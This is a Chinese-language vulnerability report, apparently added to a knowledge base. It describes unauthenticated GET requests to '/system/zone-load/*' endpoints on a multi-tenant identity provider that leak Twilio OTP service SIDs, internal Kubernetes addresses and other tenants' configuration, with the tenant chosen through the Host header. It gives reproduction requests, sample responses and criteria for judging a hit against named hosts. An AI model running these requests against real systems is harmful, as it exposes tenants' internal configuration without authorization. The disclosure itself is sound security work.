@@ -1,0 +1,96 @@
+# Encaps Point Nexus /system/zone-load/* 未认证泄露租户配置（IdP 主机 → Twilio OTP Service SID + 内部 K8s 地址）
+
+## 组件 / 版本
+Encaps Point Nexus 多租户 OIDC IdP / SSR 后端。
+- IdP 前端：https://<idp-host>/GreenManGaming/auth/main.v-3.2.11.js
+- 业务前端：https://<target>/GreenManGaming/app/main.v-3.2.22.js
+- 端点族接口：GET /system/zone-load/<loader>（SSR 数据加载器）
+
+## 前置条件
+- 目标为 Encaps Point Nexus 站点（*.encaps.io 的 auth/idp 主机，或同后端的业务/dms 主机）。
+- 无需任何账号 / Cookie / Authorization 凭据。纯匿名 HTTP GET，低噪。
+- 重要：该后端为多租户 —— 租户由 **Host 头** 决定，同一 IP/后端可用不同 Host 拉不同租户配置。
+
+## 端口/端点族
+同族 loader（从前端 JS grep "zone-load" 可得，实测存在）：
+`whitelabel-grant`、`system-layout`、`whitelabel-choose`、`login`、`login-as`、`grant`、`home`、`layout-index`、`finalize-account`（约 10 个），均未认证可达。
+
+## 复现
+
+### 0) 阴性对照（必做，排除 SPA 回落页误报）
+```
+GET /system/zone-load/routes-admin-provider-apikeys HTTP/2
+Host: dms.<target>
+(无 Cookie)
+-> HTTP/2 302
+   location: /signin?redirect=...        # 业务/admin loader 确实受认证保护
+```
+
+### 1) 命中：未认证读取 IdP 租户配置
+```
+GET /system/zone-load/whitelabel-grant HTTP/2
+Host: gmg.auth.encaps.io
+User-Agent: <ARTEX_UA>
+Accept: */*
+(无 Cookie / 无 Authorization)
+-> HTTP/2 200
+   content-type: application/json;charset=UTF-8
+   size: ~19778B
+```
+响应体（脱敏后，时间戳/密钥字段已掩码）：
+```json
+{
+  "_zoneAppConfig": {
+    "ssr": false,
+    "baseUrl": "https://gmg.auth.encaps.io",
+    "oauthClient": null,
+    "signinUrl": "https://appgmg.point.nexus/signin",
+    "sms": {
+      "OTPStrategy": {
+        "provider": "twilio",
+        "twilio": {
+          "method": "verify",
+          "channel": "sms",
+          "verifyCustomCode": true,
+          "verifyServiceSID": "VA3ed3...<REDACTED>",
+          "messagingServiceSID": "MG1742...<REDACTED>"
+        }
+      }
+    },
+    "appURL": "https://dms.<target>",
+    "providerID": "<uuid>",
+    "appID": "<uuid>"
+  }
+}
+```
+
+### 2) 同族放量 + 多租户横向（同一后端换 Host）
+```
+GET /system/zone-load/system-layout HTTP/2
+Host: gmg.auth.encaps.io
+-> HTTP/2 200, ~19529B, body._zoneAppConfig.mailer.fromAddress=noreply@notify.encaps.io, UIData{...}
+
+GET /system/zone-load/whitelabel-grant HTTP/2
+Host: nexus.auth.encaps.io
+-> HTTP/2 200, {"_zoneAppConfig":{"appName":"PointNexus","accountTypeRestriction":"partner","appURL":"https://app.point.nexus",...}}
+```
+证明：租户由 Host 决定，端点本身不鉴权，非单点异常。
+
+## 判据
+- 匿名 GET 返回 HTTP 200 且 `content-type: application/json`（不是 `text/html` 的 SPA 回落页）；
+- body `_zoneAppConfig` 内出现仅内部可见的配置：`sms.OTPStrategy.twilio.{verifyServiceSID,messagingServiceSID}` 或 `oauthClient.internalBaseUrl = http://<svc>.<cluster>.svc.cluster.local:<port>`；
+- 阴性对照：受保护 admin/业务 loader 返回 302 → /signin，证明差异来自端点本身而非请求构造。
+
+## 影响
+非预期对外暴露的租户内部配置。Twilio `verifyServiceSID`/`messagingServiceSID` 本身不是 API 密钥（需配套 Auth Token 才能调用），但可用于服务枚举、短信流程/OTP 策略分析与社会工程；同时泄露未公开 signin 主机（appgmg.point.nexus）与内部 K8s 服务地址。定级 low。
+
+## 失败常见原因
+- 200 但 `text/html`：命中前端 SPA 回落页 → 不是本漏洞，先校验 content-type 为 application/json。
+- 404：loader 名写错 → 以前端 JS 中实际出现的为准。
+- 误报：跳过 302 阴性对照，把登录跳转当成泄露。
+
+## 关联
+KB#572 记录 dms 主机 `/system/zone-load/layouts-doc` 未认证泄露内部 K8s 地址（`http://internal-auth.<cluster>.svc.cluster.local:60103`）与 OAuth 客户端配置。本条为 IdP 主机 `whitelabel-grant`，额外泄露 Twilio OTP Service SID 与未公开 signin 主机，二者同一根因、可互为补充。
+
+## 来源
+provenance: 本机 Windows/ARTEX bash shell + curl（经平台记录代理），2026-11-11 16:xx UTC 直连实测；端点清单由业务/IdP 前端 main.v-*.js 提取。
